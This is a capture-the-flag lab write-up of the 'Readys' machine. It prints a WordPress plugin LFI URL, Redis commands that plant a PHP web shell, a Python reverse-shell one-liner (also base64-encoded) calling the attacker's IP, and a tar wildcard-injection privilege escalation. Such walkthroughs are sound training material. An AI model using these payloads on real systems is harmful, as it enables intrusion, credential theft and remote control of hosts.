### Readys Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.168.166

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Readys]
└─$ nmap -sCV -A 192.168.168.166 -p22,80,6379 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-27 03:55 WAT
Nmap scan report for 192.168.168.166
Host is up (0.21s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Readys &#8211; Just another WordPress site
|_http-generator: WordPress 5.7.2
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.01 seconds

```

We have 3 ports open 

So lets enumerate the web server which is running wordpress 

On heading there we see the default wordpress page
![image](https://user-images.githubusercontent.com/113513376/215000555-ebf493f1-c63e-45a5-975e-0624f890acf9.png)

So i'll use wpscan tool to enumerate further the wordpress cms

Firstly i'll enumerate for plugins avaiable which can be done manually also but lets use wpscan

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Readys]                                                                                                                                                                     
└─$ wpscan --url http://192.168.168.166/ -e p                                                                                                                                                                     
_______________________________________________________________                                                                                                                                                   
         __          _______   _____                                                                                                                                                                              
         \ \        / /  __ \ / ____|                                                                                                                                                                             
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ _                                                                                                                                                            
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                                                                                             
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                                            
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                            
                                                                                                                                                                                                                  
         WordPress Security Scanner by the WPScan Team                                                                                                                                                            
                         Version 3.8.22                                                                                                                                                                           
       Sponsored by Automattic - https://automattic.com/                                                                                                                                                          
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                                            
_______________________________________________________________                                                                                                                                                   
                                                                                                                                                                                                                  
[i] It seems like you have not updated the database for some time.                                                                                                                                                
[?] Do you want to update now? [Y]es [N]o, default: [N]N                                                                                                                                                          
[+] URL: http://192.168.168.166/ [192.168.168.166]                                                                                                                                                                
[+] Started: Fri Jan 27 03:55:51 2023                                                                                                                                                                             
                                                                                                                                                                                                                  
Interesting Finding(s):                                                                                                                                                                                           
                                                                                                                                                                                                                  
[+] Headers                                                                                                                                                                                                       
 | Interesting Entry: Server: Apache/2.4.38 (Debian)                                                                                                                                                              
 | Found By: Headers (Passive Detection)                                                                                                                                                                          
 | Confidence: 100%                                                                                                                                                                                               
                                                                                                                                                                                                                  
[+] XML-RPC seems to be enabled: http://192.168.168.166/xmlrpc.php                                                                                                                                                
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                 
 | Confidence: 100%                                                                                                                                                                                               
 | References:                                                                                                                                                                                                    
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                                                                                                             
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                                                                                                           
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                                                                                                                                  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                                                                            
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                                                                         
                                                                                                                                                                                                                  
[+] WordPress readme found: http://192.168.168.166/readme.html                                                                                                                                                    
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                 
 | Confidence: 100%                                                                                                                                                                                               
                                                                                                                                                                                                                  
[+] Upload directory has listing enabled: http://192.168.168.166/wp-content/uploads/                                                                                                                              
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                 
 | Confidence: 100%                                                                                                                                                                                               
                                                                                                                                                                                                                  
[+] The external WP-Cron seems to be enabled: http://192.168.168.166/wp-cron.php                                                                                                                                  
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                 
 | Confidence: 60%                                                                                                                                                                                                
 | References:                                                                                                                                                                                                    
 |  - https://www.iplocation.net/defend-wordpress-from-ddos                                                                                                                                                       
 |  - https://github.com/wpscanteam/wpscan/issues/1299  
 [+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.168.166/index.php/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |  - http://192.168.168.166/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.168.166/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://192.168.168.166/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://192.168.168.166/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.168.166/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://192.168.168.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.168.166/wp-content/plugins/site-editor/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 27 03:56:03 2023
[+] Requests Done: 33
[+] Cached Requests: 5
[+] Data Sent: 8.17 KB
[+] Data Received: 366.562 KB
[+] Memory used: 235.559 MB
[+] Elapsed time: 00:00:12
```

From the scan we see that there's a plugin called `site-editor` and its version is `1.1.1` 

We can also get this by viewing the web page source code
![image](https://user-images.githubusercontent.com/113513376/215001056-e1d98ac7-c057-4b69-bfe2-1c0d048fa2ec.png)


Anyways lets search for exploit

On searching i got this exploit from [ExploitDB](https://www.exploit-db.com/exploits/44340)

Its an LFI vulnerability so we can use it to read local files

So lets read the `/etc/passwd` file to confirm it
![image](https://user-images.githubusercontent.com/113513376/215001187-4d87a5cc-4da8-42cc-8fec-bf54b7bdfe55.png)

It worked cool

Now if we remember we saw `redis` running on the target

Lets read the redis config file using this LFI
![image](https://user-images.githubusercontent.com/113513376/215001385-0cbc128d-3c4a-4790-836b-81a4248f63dd.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
redis:x:107:114::/var/lib/redis:/usr/sbin/nologin
alice:x:1000:1000::/home/alice:/bin/bash
```


After reading it i got the redis password which is `Ready4Redis?`

```
################################## SECURITY ###################################

# Require clients to issue AUTH <PASSWORD> before processing any other
# commands.  This might be useful in environments in which you do not trust
# others with access to the host running redis-server.
#
# This should stay commented out for backward compatibility and because most
# people do not need auth (e.g. they run their own servers).
#
# Warning: since Redis is pretty fast an outside user can try up to
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
#
requirepass Ready4Redis?

```

Now lets hope on to redis and check it out

I'll use `redis-cli` to naviagate through it 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Readys]                                                                                                                                                                     
└─$ redis-cli -h 192.168.168.166                                                                                                                                                                                  
192.168.168.166:6379> AUTH Ready4Redis?                                                                                                                                                                           
OK                                                                                                                                                                                                                
```

Now lets check the server info

```
192.168.168.166:6379> info                                                                                                                                                                                        
# Server                                                                                                                                                                                                          
redis_version:5.0.14                                                                                                                                                                                              
redis_git_sha1:00000000                                                                                                                                                                                           
redis_git_dirty:0                                                                                                                                                                                                 
redis_build_id:ddd3b1f304a7d4d5                                                                                                                                                                                   
redis_mode:standalone                                                                                                                                                                                             
os:Linux 4.19.0-18-amd64 x86_64                                                                                                                                                                                   
arch_bits:64                                                                                                                                                                                                      
multiplexing_api:epoll                                                                                                                                                                                            
atomicvar_api:atomic-builtin                                                                                                                                                                                      
gcc_version:8.3.0                                                                                                                                                                                                 
process_id:471                                                                                                                                                                                                    
run_id:2ae2a4bfb2306eacf945a19cd7cc0f18f9b8d45d                                                                                                                                                                   
tcp_port:6379                                                                                                                                                                                                     
uptime_in_seconds:1039                                                                                                                                                                                            
uptime_in_days:0                                                                                                                                                                                                  
hz:10                                                                                                                                                                                                             
configured_hz:10                                                                                                                                                                                                  
lru_clock:13844600                                                                                                                                                                                                
executable:/usr/bin/redis-server                                                                                                                                                                                  
config_file:/etc/redis/redis.conf                                                                                                                                                                                 
                                                                                                                                                                                                                  
# Clients                                                                                                                                                                                                         
connected_clients:1                                                                                                                                                                                               
client_recent_max_input_buffer:2                                                                                                                                                                                  
client_recent_max_output_buffer:0                                                                                                                                                                                 
blocked_clients:0                                                                                                                                                                                                 
                                                                                                                                                                                                                  
# Memory                                                                                                                                                                                                          
used_memory:859168                                                                                                                                                                                                
used_memory_human:839.03K                                                                                                                                                                                         
used_memory_rss:9814016                                                                                                                                                                                           
used_memory_rss_human:9.36M                                                                                                                                                                                       
used_memory_peak:860224                                                                                                                                                                                           
used_memory_peak_human:840.06K                                                                                                                                                                                    
used_memory_peak_perc:99.88%                                                                                                                                                                                      
used_memory_overhead:846966                                                                                                                                                                                       
used_memory_startup:797272                                                                                                                                                                                        
used_memory_dataset:12202                                                                                                                                                                                         
used_memory_dataset_perc:19.71%                                                                                                                                                                                   
allocator_allocated:1202944                                                                                                                                                                                       
allocator_active:1458176                                                                                                                                                                                          
allocator_resident:3821568                                                                                                                                                                                        
total_system_memory:2091155456                                                                                                                                                                                    
total_system_memory_human:1.95G                                                                                                                                                                                   
used_memory_lua:41984                                                                                                                                                                                             
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.21
allocator_frag_bytes:255232
allocator_rss_ratio:2.62
allocator_rss_bytes:2363392
rss_overhead_ratio:2.57
rss_overhead_bytes:5992448
mem_fragmentation_ratio:12.01
mem_fragmentation_bytes:8996848
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1674787945
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:8
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:316
total_net_output_bytes:3507
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:f0bc98be90e34abd68cada81820d3eed86a88674
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.810406
used_cpu_user:0.400862
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Cluster
cluster_enabled:0

# Keyspace
```

Now on checking [gtfobins](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell)

I can put a php web shell on the web server

```
192.168.168.166:6379> config set dir /dev/shm
OK
192.168.168.166:6379> config set dbfilename shell.php
OK
192.168.168.166:6379> set test "<?php system($_GET['cmd']); ?>"
OK
192.168.168.166:6379> save
OK
192.168.168.166:6379>
```

Now i can leverage the lfi to read the `/dev/shm/shell.php` then execute os command

Payload

```
http://192.168.168.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/dev/shm/shell.php&cmd=ls
```

![image](https://user-images.githubusercontent.com/113513376/215002762-63f5aa01-9b1b-42aa-a658-2784578868ce.png)

Now lets get shell

```
                                                                                                                                                                                                                  
┌──(mark__haxor)-[~/Desktop/Tools]
└─$ ./shellgen.sh -t python -I tun0 -p 80                     
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

                                                                                                                                                                                                                  
┌──(mark__haxor)-[~/Desktop/Tools]
└─$ ./shellgen.sh -t python -I tun0 -p 80 -e base64
cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxOTIuMTY4LjQ1LjUiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL3NoIiknCg==
```

![image](https://user-images.githubusercontent.com/113513376/215003526-7ee98699-221e-4eeb-a031-f5aa666fdfaf.png)

Now after giving the web the encoded string it hangs but back on the listener we get a call back

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Readys]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.168.166] 33776
$ 

```

Now lets stabilize this shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + z
stty raw -echo;fg
reset
```

Now lets get root

On checking crontab we see there's a script which root runs every 3minutes 

```
alice@readys:/home/alice$ cat /etc/crontab 
*/3 * * * * root /usr/local/bin/backup.sh
alice@readys:/home/alice$ 
```

Lets check the content of the script

```
alice@readys:/home/alice$ cd /usr/local/bin
alice@readys:/usr/local/bin$ cat backup.sh 
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
alice@readys:/usr/local/bin$
```

Cool so here's what it does

```
1. It changes directory to /var/www/html
2. It finds all files in the current directory that has been modified in the last 3 minutes
3. If it does find the file it creates a tar archive and stores it in /opt/backups/
4. It then ends the if condition
```

Now here's what juicy about this 

The tar doesn't really validate what it's archiving 

Since it's using the wildcard `*` 

We can take advantage of this by exploiting the `tar wildcard injection`

```
alice@readys:/var/www/html$ echo "chmod +s /bin/bash" > shell.sh
alice@readys:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
alice@readys:/var/www/html$ echo "" > --checkpoint=1
alice@readys:/var/www/html$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash

```

In the backend it will look like this 

```
tar -cf /opt/backups/website.tar --checkpoint=1 --checkpoint=action=exec=sh shell.sh
```

Where:

```
1. --checkpoint[=NUMBER] - Use “checkpoints”: display a progress message every NUMBER records (default 10)
2. --checkpoint-action=ACTION: Execute ACTION at every checkpoint, in our case exec
3. exec=command: Execute the given command
```

The shell.sh contains a bash shell with a command that sets SUID bit to `/bin/bash`

The second command executes the shell.sh

So when the cronjob will execute the next 3 minutes, it will take those files as arguments/flags rather than a normal file name and set /bin/bash with setuid permission

Now after 3 minutes lets check the perm on `/bin/bash`

```
alice@readys:/var/www/html$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$ 
```

Cool it worked 

Now lets get root

```
alice@readys:/var/www/html$ bash -p
bash-5.0# cd /root
bash-5.0# ls -al
total 24
drwx------  3 root root 4096 Jan 26 21:52 .
drwxr-xr-x 18 root root 4096 Nov  9  2021 ..
lrwxrwxrwx  1 root root    9 Nov 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  595 Oct 27  2020 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Nov 16  2021 .ssh
-rw-------  1 root root   33 Jan 26 21:52 proof.txt
bash-5.0# cat proof.txt
026a50991864c342a819900b4de7fc16
bash-5.0#
```

And we're done 🤠


<br> <br>
[Back To Home](../../index.md)
<br>






